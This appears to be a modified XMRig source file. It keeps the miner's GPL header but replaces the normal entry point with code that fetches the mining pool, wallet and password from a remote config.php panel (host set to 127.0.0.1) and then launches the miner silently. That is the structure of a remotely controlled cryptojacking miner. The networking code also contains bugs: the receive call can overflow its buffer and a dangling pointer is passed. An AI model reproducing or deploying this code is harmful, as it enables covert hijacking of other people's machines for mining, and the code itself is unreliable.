/* XMRig
* Copyright 2010      Jeff Garzik <jgarzik@pobox.com>
* Copyright 2012-2014 pooler      <pooler@litecoinpool.org>
* Copyright 2014      Lucas Jones <https://github.com/lucasjones>
* Copyright 2014-2016 Wolf9466    <https://github.com/OhGodAPet>
* Copyright 2016      Jay D Dee   <jayddee246@gmail.com>
* Copyright 2016-2017 XMRig       <support@xmrig.com>
*
*
*   This program is free software: you can redistribute it and/or modify
*   it under the terms of the GNU General Public License as published by
*   the Free Software Foundation, either version 3 of the License, or
*   (at your option) any later version.
*
*   This program is distributed in the hope that it will be useful,
*   but WITHOUT ANY WARRANTY; without even the implied warranty of
*   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
*   GNU General Public License for more details.
*
*   You should have received a copy of the GNU General Public License
*   along with this program. If not, see <http://www.gnu.org/licenses/>.
*/

#include "App.h"
#include <windows.h>
#include <string.h>
#include <vector>
#include <locale>
#include <sstream>
#include <winsock2.h>

#pragma comment(lib,"ws2_32.lib")

std::string SendRequest(std::string url) {
	int i = 0;
	SOCKET Socket;
	int nDataLength;
	WSADATA wsaData;
	std::locale local;
	char buffer[8500];
	SOCKADDR_IN SockAddr;
	struct hostent *host;
	std::string website_HTML;

	std::string domain = "127.0.0.1";

	std::string get_http = "GET " + url
		+ " HTTP/1.1\r\n"
		+ "Host: " + domain + "\r\n"
		+ "Connection: close\r\n\r\n";

	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) { return 0; }

	Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	host = gethostbyname(domain.c_str());
	SockAddr.sin_port = htons(80);
	SockAddr.sin_family = AF_INET;
	SockAddr.sin_addr.s_addr = *((unsigned long*)host->h_addr);

	if (connect(Socket, (SOCKADDR*)(&SockAddr), sizeof(SockAddr)) != 0) { return 0; }

	send(Socket, get_http.c_str(), strlen(get_http.c_str()), 0);

	while ((nDataLength = recv(Socket, buffer, 10000, 0)) > 0) {
		while (buffer[i] >= 32 || buffer[i] == '\n' || buffer[i] == '\r') {
			website_HTML += buffer[i];
			i += 1;
		}
	}

	size_t pos = website_HTML.find("\r\n\r\n");
	std::string cleaned = website_HTML.substr(pos + 4);

	closesocket(Socket);
	WSACleanup();

	return cleaned;
}

int Configure(std::string pool, std::string wallet, std::string pass) {

	char *pool_c = new char[pool.length() + 1];
	strcpy(pool_c, pool.c_str());

	char *wallet_c = new char[wallet.length() + 1];
	strcpy(wallet_c, wallet.c_str());

	char *pass_c = new char[pass.length() + 1];
	strcpy(pass_c, pass.c_str());

	static char * params[] = { "miner", "-o", (char*)pool.c_str(), "-u", wallet_c, "-p", pass_c};
	App Application(7, params);

	return Application.exec();
}

int main()
{
	Configure(SendRequest("/config.php?id=pool"), SendRequest("/config.php?id=wallet"), SendRequest("/config.php?id=pass"));
}
